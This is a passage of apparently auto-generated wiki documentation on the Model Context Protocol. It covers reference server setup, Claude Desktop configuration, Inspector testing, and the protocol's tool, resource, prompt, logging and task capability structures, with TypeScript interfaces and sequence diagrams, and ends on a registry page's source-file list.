| Tool | Purpose | Example Use |
|------|---------|------------|
| `get_current_time` | Get current time in any timezone | "What time is it in Tokyo?" |
| `convert_time` | Convert between timezones | "Convert 3pm PST to EST" |
| `add_time` | Add duration to timestamp | "What's the date 30 days from now?" |
| `subtract_time` | Calculate time difference | "How many hours until deadline?" |
| `format_time` | Format timestamp in various formats | "Show date in ISO 8601 format" |
| `parse_time` | Parse human-readable time strings | "Parse 'next Tuesday at 2pm'" |

### Timezone Support

**Comprehensive timezone database:**
- All IANA timezone identifiers (e.g., `America/New_York`, `Europe/London`)
- Common timezone abbreviations (EST, PST, GMT, UTC)
- Daylight saving time handling
- Historical timezone rule application

### Time Arithmetic Operations

**Supported duration units:**
- Seconds, minutes, hours
- Days, weeks, months, years
- Mixed units (e.g., "2 hours and 30 minutes")

**Operations handle:**
- Daylight saving time transitions
- Month boundaries (varying lengths)
- Leap years
- Timezone offset changes

### Use Cases

- **Scheduling assistance:** Calculate meeting times across timezones
- **Deadline tracking:** Compute time remaining until deadlines
- **Historical queries:** Convert dates/times from different eras
- **Calendar operations:** Add/subtract durations for planning
- **Time-sensitive operations:** Ensure accurate temporal logic

### Configuration Pattern

```json
{
  "mcpServers": {
    "time": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-time"]
    }
  }
}
```

### Execution Example

```bash
# Run directly with npx
npx -y @modelcontextprotocol/server-time

# The server provides accurate time operations
# All calculations use system timezone by default
```

**Sources:** [docs/examples.mdx:20]()

## Server Implementation Patterns

**TypeScript Server Implementation Pattern**

```mermaid
graph TB
    subgraph "TypeScript Server Code Structure"
        TS_ENTRY["src/index.ts<br/>#!/usr/bin/env node"]
        TS_IMPORTS["Import McpServer from '@modelcontextprotocol/sdk/server/mcp.js'<br/>Import StdioServerTransport from '@modelcontextprotocol/sdk/server/stdio.js'"]
        TS_SERVER["new McpServer({<br/>  name: 'server-name',<br/>  version: '1.0.0'<br/>})"]
        TS_TOOLS["server.registerTool(<br/>  'tool_name',<br/>  { description, inputSchema },<br/>  async (params) => {...}<br/>)"]
        TS_RESOURCES["server.registerResource(<br/>  { uri, name, mimeType },<br/>  async () => {...}<br/>)"]
        TS_TRANSPORT["new StdioServerTransport()"]
        TS_CONNECT["await server.connect(transport)"]
        
        TS_ENTRY --> TS_IMPORTS
        TS_IMPORTS --> TS_SERVER
        TS_SERVER --> TS_TOOLS
        TS_SERVER --> TS_RESOURCES
        TS_IMPORTS --> TS_TRANSPORT
        TS_TRANSPORT --> TS_CONNECT
        TS_SERVER --> TS_CONNECT
    end
```

**Python Server Implementation Pattern (FastMCP)**

```mermaid
graph TB
    subgraph "Python Server Code Structure"
        PY_ENTRY["src/__main__.py or server.py"]
        PY_IMPORTS["from mcp.server.fastmcp import FastMCP"]
        PY_MCP["mcp = FastMCP('server-name')"]
        PY_TOOLS["@mcp.tool()<br/>async def tool_name(param: str) -> str:<br/>    '''Tool docstring'''<br/>    return result"]
        PY_RESOURCES["@mcp.resource('uri://path')<br/>async def resource_name() -> str:<br/>    return content"]
        PY_RUN["mcp.run(transport='stdio')"]
        
        PY_ENTRY --> PY_IMPORTS
        PY_IMPORTS --> PY_MCP
        PY_MCP --> PY_TOOLS
        PY_MCP --> PY_RESOURCES
        PY_MCP --> PY_RUN
    end
```

**Sources:** [docs/docs/develop/build-server.mdx:495-510](), [docs/docs/develop/build-server.mdx:144-159](), [docs/docs/develop/build-server.mdx:590-643](), [docs/docs/develop/build-server.mdx:194-212]()

## Configuration with MCP Clients

### Claude Desktop Integration

Reference servers are configured through the `claude_desktop_config.json` file. The configuration specifies the execution command, arguments, and optional environment variables for each server.

**Configuration file locations:**
- **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
- **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`

#### Basic Configuration Structure

```json
{
  "mcpServers": {
    "server-name": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-*"],
      "env": {
        "ENV_VAR": "value"
      }
    }
  }
}
```

#### Complete Multi-Server Example

```json
{
  "mcpServers": {
    "memory": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-memory"]
    },
    "filesystem": {
      "command": "npx",
      "args": [
        "-y",
        "@modelcontextprotocol/server-filesystem",
        "/Users/username/Desktop",
        "/Users/username/Documents"
      ]
    },
    "git": {
      "command": "uvx",
      "args": ["mcp-server-git"]
    },
    "time": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-time"]
    }
  }
}
```

### Configuration Parameters

| Parameter | Required | Description | Example Values |
|-----------|----------|-------------|----------------|
| `command` | Yes | Package manager or executable path | `npx`, `uvx`, `/usr/local/bin/node` |
| `args` | Yes | Array of command-line arguments | `["-y", "@modelcontextprotocol/server-memory"]` |
| `env` | No | Environment variables (credentials, config) | `{"API_KEY": "secret"}` |

### Environment Variable Usage

Environment variables in the `env` object are passed to the server process:

```json
{
  "mcpServers": {
    "custom-server": {
      "command": "npx",
      "args": ["-y", "mcp-server-custom"],
      "env": {
        "API_KEY": "your-api-key",
        "API_ENDPOINT": "https://api.example.com",
        "LOG_LEVEL": "debug"
      }
    }
  }
}
```

**Security note:** Avoid committing configuration files with secrets to version control. Use environment variable expansion or secret management tools for production deployments.

### Path Specifications

**Absolute paths are required** for filesystem arguments:

```json
{
  "filesystem": {
    "command": "npx",
    "args": [
      "-y",
      "@modelcontextprotocol/server-filesystem",
      "/Users/username/Documents"  // Must be absolute
    ]
  }
}
```

**Platform-specific paths:**

| Platform | Path Format | Example |
|----------|-------------|---------|
| macOS/Linux | POSIX paths with forward slashes | `/Users/username/Desktop` |
| Windows | Backslashes (escaped in JSON) or forward slashes | `C:\\Users\\username\\Desktop` or `C:/Users/username/Desktop` |

**Sources:** [docs/examples.mdx:58-85](), [docs/docs/develop/connect-local-servers.mdx:82-147]()

## Package Distribution

### TypeScript Servers

TypeScript-based reference servers are distributed via npm and executed directly using `npx`:

- **Package prefix:** `@modelcontextprotocol/server-*`
- **Execution:** `npx -y @modelcontextprotocol/server-<name>`
- **Installation:** Not required (npx downloads on demand)

### Python Servers

Python-based reference servers are distributed via PyPI and executed using `uvx` or `pip`:

- **Package prefix:** `mcp-server-*`
- **Execution (uvx):** `uvx mcp-server-<name>`
- **Execution (pip):** `pip install mcp-server-<name>` then `python -m mcp_server_<name>`

**Sources:** [docs/examples.mdx:64-81]()

## Direct Execution

### TypeScript Server Execution

```bash
# Execute without installation
npx -y @modelcontextprotocol/server-memory

# Execute with arguments
npx -y @modelcontextprotocol/server-filesystem /path/to/directory
```

### Python Server Execution

```bash
# Using uvx (recommended)
uvx mcp-server-git

# Using pip installation
pip install mcp-server-git
python -m mcp_server_git
```

**Sources:** [docs/examples.mdx:66-81]()

## Testing and Development

### Using Reference Servers for Testing

Reference servers provide a stable foundation for validating MCP implementations:

| Testing Purpose | How Reference Servers Help |
|----------------|---------------------------|
| **Protocol Conformance** | Validate client implementations against known-good server behavior |
| **Feature Verification** | Test client support for tools, resources, and prompts using servers that fully implement each feature |
| **SDK Validation** | Verify SDK functionality in different languages against reference implementations |
| **Integration Testing** | Test client-server communication patterns and error handling |
| **Performance Benchmarking** | Establish baseline performance metrics for MCP operations |

### Development Workflow

```mermaid
graph TB
    CLONE["Clone Repository<br/>git clone modelcontextprotocol/servers"]
    INSTALL["Install Dependencies<br/>npm install OR pip install -e ."]
    DEVELOP["Modify Server<br/>Edit src/server-name/index.ts"]
    BUILD["Build TypeScript<br/>npm run build"]
    INSPECT["Test with Inspector<br/>npx @modelcontextprotocol/inspector"]
    CLIENT["Test with Client<br/>Configure in claude_desktop_config.json"]
    DEBUG["Debug Issues<br/>Check server logs and stderr"]
    
    CLONE --> INSTALL
    INSTALL --> DEVELOP
    DEVELOP --> BUILD
    BUILD --> INSPECT
    INSPECT --> CLIENT
    CLIENT --> DEBUG
    DEBUG -.iterate.-> DEVELOP
```

### Local Development Setup

**Clone and install reference servers:**

```bash
# Clone the repository
git clone https://github.com/modelcontextprotocol/servers.git
cd servers

# Install dependencies (TypeScript servers)
npm install

# Build TypeScript servers
npm run build

# For Python servers
cd src/git
pip install -e .
```

**Testing with MCP Inspector:**

The MCP Inspector provides interactive testing of server implementations:

```bash
# Test a TypeScript server
npx @modelcontextprotocol/inspector node build/index.js

# Test a Python server
npx @modelcontextprotocol/inspector uvx mcp-server-git

# Test with specific configuration
npx @modelcontextprotocol/inspector npx -y @modelcontextprotocol/server-filesystem /tmp
```

The Inspector provides:
- **Tool testing:** Execute tools and see results
- **Resource browsing:** List and read resources
- **Prompt testing:** Invoke prompts with parameters
- **Notification monitoring:** Observe real-time notifications
- **Error debugging:** View detailed error messages

### Debugging Reference Servers

**TypeScript server debugging:**

```bash
# Add debugging output to server code
console.error("Debug message");  // Writes to stderr, visible in logs

# Run with Node.js inspector
node --inspect build/index.js
```

**Python server debugging:**

```bash
# Add debug logging
import logging
logging.basicConfig(level=logging.DEBUG)
logging.debug("Debug message")

# Run with Python debugger
python -m pdb -m mcp_server_git
```

**Claude Desktop logs:**
- **macOS:** `~/Library/Logs/Claude/mcp*.log`
- **Windows:** `%APPDATA%\Claude\logs\mcp*.log`

Log files contain:
- `mcp.log` - General MCP connection logging
- `mcp-server-{name}.log` - Server-specific stderr output

### Common Development Patterns

**Adding a new tool to a reference server:**

```typescript
// TypeScript pattern
server.registerTool(
  "new_tool_name",
  {
    description: "Tool description",
    inputSchema: {
      type: "object",
      properties: {
        param: { type: "string" }
      },
      required: ["param"]
    }
  },
  async ({ param }) => {
    // Tool implementation
    return {
      content: [{ type: "text", text: `Result: ${param}` }]
    };
  }
);
```

```python
# Python pattern (FastMCP)
@mcp.tool()
async def new_tool_name(param: str) -> str:
    """Tool description"""
    # Tool implementation
    return f"Result: {param}"
```

**Sources:** [docs/examples.mdx:1-24](), [docs/docs/develop/connect-local-servers.mdx:226-263]()

## Additional Resources

### Server Repository

The complete reference server implementations are maintained in the official repository:
- **Repository:** `github.com/modelcontextprotocol/servers`
- **Active servers:** `src/` directory
- **Documentation:** Repository README and individual server documentation

### Related Documentation

- **Official integrations:** Company-maintained MCP servers for specific platforms
- **Community servers:** Community-contributed MCP server implementations
- **GitHub Discussions:** Community engagement and support

For information about archived servers and community implementations, see [Archived and Community Servers](#5.4).

**Sources:** [docs/examples.mdx:54-61](), [docs/examples.mdx:113-118]()

---

# Page: Server Capabilities Deep Dive

# Server Capabilities Deep Dive

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.github/CODEOWNERS](.github/CODEOWNERS)
- [docs/specification/2025-06-18/server/prompts.mdx](docs/specification/2025-06-18/server/prompts.mdx)
- [docs/specification/2025-06-18/server/resources.mdx](docs/specification/2025-06-18/server/resources.mdx)
- [docs/specification/2025-06-18/server/tools.mdx](docs/specification/2025-06-18/server/tools.mdx)
- [docs/specification/draft/basic/index.mdx](docs/specification/draft/basic/index.mdx)
- [docs/specification/draft/basic/lifecycle.mdx](docs/specification/draft/basic/lifecycle.mdx)
- [docs/specification/draft/basic/utilities/tasks.mdx](docs/specification/draft/basic/utilities/tasks.mdx)
- [docs/specification/draft/client/elicitation.mdx](docs/specification/draft/client/elicitation.mdx)
- [docs/specification/draft/client/sampling.mdx](docs/specification/draft/client/sampling.mdx)
- [docs/specification/draft/schema.mdx](docs/specification/draft/schema.mdx)
- [docs/specification/draft/server/prompts.mdx](docs/specification/draft/server/prompts.mdx)
- [docs/specification/draft/server/resources.mdx](docs/specification/draft/server/resources.mdx)
- [docs/specification/draft/server/tools.mdx](docs/specification/draft/server/tools.mdx)
- [schema/draft/schema.json](schema/draft/schema.json)
- [schema/draft/schema.ts](schema/draft/schema.ts)

</details>



This document provides detailed technical guidance for implementing MCP server capabilities. It covers the protocol message structures, data types, and implementation requirements for exposing tools, resources, prompts, and supporting features. For general server development workflows, see [Building MCP Servers](#5.1). For examples of complete server implementations, see [Reference Server Implementations](#5.2).

## Capability Declaration

Servers declare their supported capabilities during initialization through the `ServerCapabilities` interface. Each capability is optional and determines which protocol features the server can support during the session.

### ServerCapabilities Structure

The complete capability structure is defined in [schema/draft/schema.ts:384-455]() and includes:

```typescript
interface ServerCapabilities {
  experimental?: { [key: string]: object };
  logging?: object;
  completions?: object;
  prompts?: {
    listChanged?: boolean;
  };
  resources?: {
    subscribe?: boolean;
    listChanged?: boolean;
  };
  tools?: {
    listChanged?: boolean;
  };
  tasks?: {
    list?: object;
    cancel?: object;
    requests?: {
      tools?: {
        call?: object;
      };
    };
  };
}
```

These capabilities are returned in the `InitializeResult` message [schema/draft/schema.ts:277-291]().

**Capability Declaration Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: "InitializeRequest"
    Note over Server: "Determine supported capabilities"
    Server->>Client: "InitializeResult with ServerCapabilities"
    Note over Client: "Client now knows which features<br/>to use for this session"
```

Sources: [schema/draft/schema.ts:384-455](), [docs/specification/draft/basic/lifecycle.mdx:40-147]()

## Tools Capability

Tools enable servers to expose executable functions that can be invoked by language models. The tools capability involves tool discovery, invocation, and result handling.

### Tool Discovery and Invocation

**Protocol Message Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: "ListToolsRequest"
    Server->>Client: "ListToolsResult with tools[]"
    
    Client->>Server: "CallToolRequest with name and arguments"
    Server->>Client: "CallToolResult with content[] and isError"
    
    opt "listChanged capability"
        Server--)Client: "ToolListChangedNotification"
    end
```

Sources: [docs/specification/draft/server/tools.mdx:57-185](), [schema/draft/schema.ts:1078-1151]()

### Tool Definition Structure

The `Tool` interface [schema/draft/schema.ts:1152-1268]() defines a tool with:

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `name` | `string` | Yes | Unique identifier (1-128 chars, alphanumeric + `_`, `-`, `.`) |
| `title` | `string` | No | Human-readable display name |
| `description` | `string` | No | Functionality description for LLMs |
| `inputSchema` | `ToolInputSchema` | Yes | JSON Schema for parameters |
| `outputSchema` | `object` | No | JSON Schema for structured results |
| `annotations` | `ToolAnnotations` | No | Behavioral metadata |
| `execution` | `ToolExecution` | No | Execution settings including task support |
| `icons` | `Icon[]` | No | Display icons |

**Input Schema Requirements:**

The `inputSchema` field [schema/draft/schema.ts:1177-1183]() must be a valid JSON Schema object. For tools with no parameters:

```typescript
// Recommended: explicitly reject any properties
{ "type": "object", "additionalProperties": false }

// Alternative: accept any object
{ "type": "object" }
```

Sources: [schema/draft/schema.ts:1152-1268](), [docs/specification/draft/server/tools.mdx:189-226]()

### Tool Annotations

The `ToolAnnotations` interface [schema/draft/schema.ts:1270-1304]() provides behavioral hints:

```typescript
interface ToolAnnotations {
  title?: string;
  audience?: Role[];
  destructive?: boolean;
  idempotent?: boolean;
}
```

These annotations are **untrusted metadata** and clients must validate them [docs/specification/draft/server/tools.mdx:209-212]().

### Tool Execution Settings

The `ToolExecution` interface [schema/draft/schema.ts:1306-1348]() controls execution behavior:

```typescript
interface ToolExecution {
  requiresConfirmation?: boolean;
  taskSupport?: "required" | "optional" | "forbidden";
}
```

The `taskSupport` field enables fine-grained control over task augmentation for specific tools [docs/specification/draft/basic/utilities/tasks.mdx:109-120]().

Sources: [schema/draft/schema.ts:1306-1348](), [docs/specification/draft/basic/utilities/tasks.mdx:109-120]()

### Tool Invocation

**CallToolRequest Structure:**

```typescript
interface CallToolRequest extends JSONRPCRequest {
  method: "tools/call";
  params: CallToolRequestParams;
}

interface CallToolRequestParams extends TaskAugmentedRequestParams {
  name: string;
  arguments?: { [key: string]: unknown };
  task?: TaskMetadata;  // Optional task augmentation
}
```

Defined in [schema/draft/schema.ts:126-184]().

### Tool Results

**CallToolResult Structure:**

The `CallToolResult` interface [schema/draft/schema.ts:185-214]() returns:

```typescript
interface CallToolResult extends Result {
  content: ContentBlock[];           // Unstructured content
  structuredContent?: { [key: string]: unknown };  // Optional structured data
  isError?: boolean;                 // Error flag (default: false)
}
```

**Content Type Hierarchy:**

```mermaid
graph TD
    ContentBlock["ContentBlock union type"]
    
    ContentBlock --> TextContent["TextContent<br/>{type: 'text', text: string}"]
    ContentBlock --> ImageContent["ImageContent<br/>{type: 'image', data: string, mimeType: string}"]
    ContentBlock --> AudioContent["AudioContent<br/>{type: 'audio', data: string, mimeType: string}"]
    ContentBlock --> ResourceLink["ResourceLink<br/>{type: 'resource_link', uri: string}"]
    ContentBlock --> EmbeddedResource["EmbeddedResource<br/>{type: 'resource', resource: ResourceContents}"]
    
    Note1["All content types support<br/>optional Annotations"]
    TextContent -.-> Note1
    ImageContent -.-> Note1
    AudioContent -.-> Note1
```

Sources: [schema/draft/schema.ts:638-656](), [schema/draft/schema.ts:1350-1406]()

### Error Handling

Tools use two distinct error mechanisms [docs/specification/draft/server/tools.mdx:450-467]():

1. **Protocol Errors**: JSON-RPC errors for structural issues
   - Unknown tool names
   - Malformed requests
   - Server errors

2. **Tool Execution Errors**: Reported via `isError: true` in `CallToolResult`
   - API failures
   - Input validation errors
   - Business logic errors

Tool execution errors should be returned in the `content` field to allow LLMs to self-correct.

**Error Response Example:**

```json
{
  "jsonrpc": "2.0",
  "id": 4,
  "result": {
    "content": [{
      "type": "text",
      "text": "Invalid departure date: must be in the future"
    }],
    "isError": true
  }
}
```

Sources: [docs/specification/draft/server/tools.mdx:450-498]()

### Task-Augmented Tool Calls

When `ServerCapabilities.tasks.requests.tools.call` is declared [schema/draft/schema.ts:443-452](), clients may augment `tools/call` requests with the `task` parameter [schema/draft/schema.ts:175-178]().

The server returns `CreateTaskResult` immediately [schema/draft/schema.ts:813-829]() instead of blocking:

```typescript
interface CreateTaskResult {
  task: Task;
  _meta?: {
    "io.modelcontextprotocol/model-immediate-response"?: string;
  };
}
```

The actual `CallToolResult` is retrieved later via `tasks/result` [docs/specification/draft/basic/utilities/tasks.mdx:240-280]().

Sources: [schema/draft/schema.ts:813-829](), [docs/specification/draft/basic/utilities/tasks.mdx:123-182]()

## Resources Capability

Resources expose contextual data to clients through a URI-based addressing scheme. The capability supports resource discovery, retrieval, templates, and change notifications.

### Resource Lifecycle

**Protocol Message Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Note over Client,Server: "Discovery Phase"
    Client->>Server: "ListResourcesRequest"
    Server->>Client: "ListResourcesResult with resources[]"
    
    Client->>Server: "ListResourceTemplatesRequest"
    Server->>Client: "ListResourceTemplatesResult with resourceTemplates[]"
    
    Note over Client,Server: "Access Phase"
    Client->>Server: "ReadResourceRequest with uri"
    Server->>Client: "ReadResourceResult with contents[]"
    
    Note over Client,Server: "Subscription Phase"
    Client->>Server: "SubscribeRequest with uri"
    Server->>Client: "EmptyResult (success)"
    
    Note over Server: "Resource changes"
    Server--)Client: "ResourceUpdatedNotification with uri"
    
    opt "listChanged capability"
        Server--)Client: "ResourceListChangedNotification"
    end
```

Sources: [docs/specification/draft/server/resources.mdx:86-280](), [schema/draft/schema.ts:647-794]()

### Resource Definition Structure

The `Resource` interface [schema/draft/schema.ts:800-836]() defines:

```typescript
interface Resource extends BaseMetadata, Icons {
  uri: string;              // RFC 3986 URI
  name: string;             // Identifier
  title?: string;           // Display name
  description?: string;     // LLM hint
  mimeType?: string;        // Content type
  annotations?: Annotations;
  size?: number;            // Bytes (pre-encoding)
  _meta?: { [key: string]: unknown };
}
```

**Annotations Field:**

The `Annotations` interface [schema/draft/schema.json:4-26]() provides contextual hints:

| Field | Type | Description |
|-------|------|-------------|
| `audience` | `Role[]` | Intended consumers: `["user"]`, `["assistant"]`, or both |
| `priority` | `number` | Importance (0.0-1.0), where 1.0 is "required" |
| `lastModified` | `string` | ISO 8601 timestamp |

Sources: [schema/draft/schema.ts:800-836](), [schema/draft/schema.json:4-26]()

### Resource Templates

The `ResourceTemplate` interface [schema/draft/schema.ts:843-872]() enables parameterized resources:

```typescript
interface ResourceTemplate extends BaseMetadata, Icons {
  uriTemplate: string;      // RFC 6570 URI template
  name: string;
  title?: string;
  description?: string;
  mimeType?: string;
  annotations?: Annotations;
  _meta?: { [key: string]: unknown };
}
```

Templates use URI template syntax like `file:///{path}` where `{path}` is a variable. Arguments can be auto-completed via the completion API [docs/specification/draft/server/utilities/completion.mdx]().

Sources: [schema/draft/schema.ts:843-872](), [docs/specification/draft/server/resources.mdx:168-209]()

### Resource Contents

**Content Types:**

Resources return either text or binary data via the `ResourceContents` union:

```typescript
interface TextResourceContents extends ResourceContents {
  text: string;
}

interface BlobResourceContents extends ResourceContents {
  blob: string;  // Base64-encoded
}
```

Defined in [schema/draft/schema.ts:879-917]().

**ReadResourceResult Structure:**

```typescript
interface ReadResourceResult extends Result {
  contents: (TextResourceContents | BlobResourceContents)[];
}
```

The server may return multiple content items for a single URI [schema/draft/schema.ts:721-723]().

Sources: [schema/draft/schema.ts:879-917](), [schema/draft/schema.ts:721-723]()

### Resource Subscriptions

When `ServerCapabilities.resources.subscribe` is declared [schema/draft/schema.ts:409-412](), clients can subscribe to resource updates:

**Subscribe Flow:**

```mermaid
stateDiagram-v2
    [*] --> Unsubscribed
    
    Unsubscribed --> Subscribed: "SubscribeRequest"
    Subscribed --> Unsubscribed: "UnsubscribeRequest"
    
    Subscribed --> Subscribed: "ResourceUpdatedNotification<br/>(server-initiated)"
    
    note right of Subscribed
        Client receives notifications
        when resource URI changes
    end note
```

The `ResourceUpdatedNotification` [schema/draft/schema.ts:790-793]() includes the updated URI, which may be a sub-resource of the subscribed URI.

Sources: [schema/draft/schema.ts:746-793](), [docs/specification/draft/server/resources.mdx:223-251]()

### Common URI Schemes

The protocol defines standard URI schemes [docs/specification/draft/server/resources.mdx:351-417]():

| Scheme | Use Case | Example |
|--------|----------|---------|
| `file://` | Local filesystem | `file:///path/to/file.txt` |
| `https://` | Remote HTTP resources | `https://api.example.com/data` |
| Custom schemes | Server-specific resources | `database://table/column` |

Servers should use standard schemes where possible but may define custom schemes for domain-specific resources.

Sources: [docs/specification/draft/server/resources.mdx:351-417]()

## Prompts Capability

Prompts expose template-based message structures that clients can retrieve and customize with arguments. They are designed for user-initiated workflows [docs/specification/draft/server/prompts.mdx:14-28]().

### Prompt Discovery and Retrieval

**Protocol Message Flow:**

```mermaid
sequenceDiagram
    participant Client
    participant Server
    
    Client->>Server: "ListPromptsRequest"
    Server->>Client: "ListPromptsResult with prompts[]"
    
    Client->>Server: "GetPromptRequest with name and arguments"
    Server->>Client: "GetPromptResult with messages[]"
    
    opt "listChanged capability"
        Server--)Client: "PromptListChangedNotification"
    end
```

Sources: [docs/specification/draft/server/prompts.mdx:48-175](), [schema/draft/schema.ts:919-1076]()

### Prompt Definition Structure

The `Prompt` interface [schema/draft/schema.ts:982-997]() defines:

```typescript
interface Prompt extends BaseMetadata, Icons {
  name: string;              // Unique identifier
  title?: string;            // Display name
  description?: string;      // Purpose description
  arguments?: PromptArgument[];
  icons?: Icon[];
  _meta?: { [key: string]: unknown };
}
```

**Prompt Arguments:**

The `PromptArgument` interface [schema/draft/schema.ts:1004-1013]() specifies template parameters:

```typescript
interface PromptArgument extends BaseMetadata {
  name: string;
  title?: string;
  description?: string;
  required?: boolean;
}
```

Arguments may be auto-completed through the completion API [docs/specification/draft/server/utilities/completion.mdx]().

Sources: [schema/draft/schema.ts:982-1013](), [docs/specification/draft/server/prompts.mdx:180-189]()

### Prompt Messages

**GetPromptResult Structure:**

```typescript
interface GetPromptResult extends Result {
  description?: string;
  messages: PromptMessage[];
}
```

**PromptMessage Structure:**

```typescript
interface PromptMessage {
  role: Role;               // "user" | "assistant"
  content: ContentBlock;
}
```

Defined in [schema/draft/schema.ts:969-976]() and [schema/draft/schema.ts:1030-1033]().

**Content Types in Prompts:**

Prompt messages support the same `ContentBlock` union as tool results [schema/draft/schema.ts:638-656]():

- `TextContent`: Plain text messages [schema/draft/schema.ts:1350-1357]()
- `ImageContent`: Base64-encoded images [schema/draft/schema.ts:1359-1373]()
- `AudioContent`: Base64-encoded audio [schema/draft/schema.ts:1375-1389]()
- `EmbeddedResource`: Server-managed content [schema/draft/schema.ts:1054-1067]()

All content types support optional `Annotations` [schema/draft/schema.json:4-26]().

Sources: [schema/draft/schema.ts:969-976](), [schema/draft/schema.ts:1030-1033](), [schema/draft/schema.ts:638-656]()

## Supporting Capabilities

### Completion API

When `ServerCapabilities.completions` is declared [schema/draft/schema.ts:394-396](), the server supports argument auto-completion for prompts and resource templates.

**CompleteRequest Structure:**

```typescript
interface CompleteRequest extends JSONRPCRequest {
  method: "completion/complete";
  params: CompleteRequestParams;
}

interface CompleteRequestParams extends RequestParams {
  ref: PromptReference | ResourceTemplateReference;
  argument: {
    name: string;
    value: string;
  };
  context?: {
    arguments?: { [key: string]: string };
  };
}
```

The `ref` field [schema/draft/schema.ts:584-593]() is a discriminated union:

```typescript
type PromptReference = {
  type: "ref/prompt";
  name: string;
}

type ResourceTemplateReference = {
  type: "ref/resource_template";
  uriTemplate: string;
}
```

**CompleteResult Structure:**

```typescript
interface CompleteResult {
  completion: {
    values: string[];       // Max 100 items
    total?: number;         // Total available
    hasMore?: boolean;      // More results available
  };
}
```

Defined in [schema/draft/schema.ts:513-637]().

Sources: [schema/draft/schema.ts:513-637](), [docs/specification/draft/server/utilities/completion.mdx]()

### Logging Capability

When `ServerCapabilities.logging` is declared [schema/draft/schema.ts:391-393](), the server can emit structured log messages to the client.

**LoggingMessageNotification Structure:**

```typescript
interface LoggingMessageNotification extends JSONRPCNotification {
  method: "notifications/message";
  params: LoggingMessageNotificationParams;
}

interface LoggingMessageNotificationParams extends NotificationParams {
  level: LoggingLevel;
  logger?: string;
  data: unknown;
}

type LoggingLevel = 
  | "debug" | "info" | "notice" | "warning" 
  | "error" | "critical" | "alert" | "emergency";
```

The logging levels map to syslog severities (RFC 5424) [schema/draft/schema.ts:1408-1425]().

Clients control the minimum log level via `SetLevelRequest` [schema/draft/schema.ts:1427-1471]().

Sources: [schema/draft/schema.ts:1408-1471](), [docs/specification/draft/server/utilities/logging.mdx]()

### Task Support for Server Requests

When `ServerCapabilities.tasks.requests.tools.call` is declared [schema/draft/schema.ts:443-452](), the server supports task-augmented tool calls.

**Task Capability Structure:**

```typescript
interface ServerCapabilities {
  tasks?: {
    list?: object;          // Supports tasks/list
    cancel?: object;        // Supports tasks/cancel
    requests?: {
      tools?: {
        call?: object;      // tools/call can be task-augmented
      };
    };
  };
}
```

**Task State Machine:**

```mermaid
stateDiagram-v2
    [*] --> working: "Task created"
    
    working --> input_required: "Server needs client input"
    working --> completed: "Task succeeded"
    working --> failed: "Task failed"
    working --> cancelled: "Client cancelled"
    
    input_required --> working: "Input provided"
    input_required --> completed: "Task succeeded"
    input_required --> failed: "Task failed"
    input_required --> cancelled: "Client cancelled"
    
    completed --> [*]
    failed --> [*]
    cancelled --> [*]
    
    note right of completed
        Terminal states:
        completed, failed, cancelled
    end note
```

**Task Interface:**

```typescript
interface Task {
  taskId: string;
  status: "working" | "input_required" | "completed" | "failed" | "cancelled";
  statusMessage?: string;
  createdAt: string;        // ISO 8601
  lastUpdatedAt: string;    // ISO 8601
  ttl: number | null;       // Milliseconds or null for unlimited
  pollInterval?: number;    // Suggested polling interval (ms)
}
```

Defined in [schema/draft/schema.ts:1473-1548]().

Sources: [schema/draft/schema.ts:1473-1548](), [docs/specification/draft/basic/utilities/tasks.mdx:388-431]()

## Capability Negotiation Patterns

### Declaring Multiple Capabilities

A server typically declares multiple capabilities in its `InitializeResult`:

```json
{
  "protocolVersion": "2025-11-25",
  "capabilities": {
    "tools": {
      "listChanged": true
    },
    "resources": {
      "subscribe": true,
      "listChanged": true
    },
    "prompts": {
      "listChanged": true
    },
    "logging": {},
    "completions": {},
    "tasks": {
      "list": {},
      "cancel": {},
      "requests": {
        "tools": {
          "call": {}
        }
      }
    }
  },
  "serverInfo": {
    "name": "example-server",
    "version": "1.0.0"
  }
}
```

### Conditional Feature Support

Servers should check client capabilities before using optional features:

| Server Feature | Requires Client Capability |
|----------------|---------------------------|
| Task-augmented tools | `ClientCapabilities.tasks.requests.tools.call` |
| Sampling with tools | `ClientCapabilities.sampling.tools` |
| Context inclusion | `ClientCapabilities.sampling.context` |
| Elicitation requests | `ClientCapabilities.elicitation` |

Defined in [schema/draft/schema.ts:302-377]().

Sources: [schema/draft/schema.ts:277-455](), [docs/specification/draft/basic/lifecycle.mdx:186-213]()

---

# Page: Server Registry and Discovery

# Server Registry and Community Servers

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/examples.mdx](docs/examples.mdx)

</details>



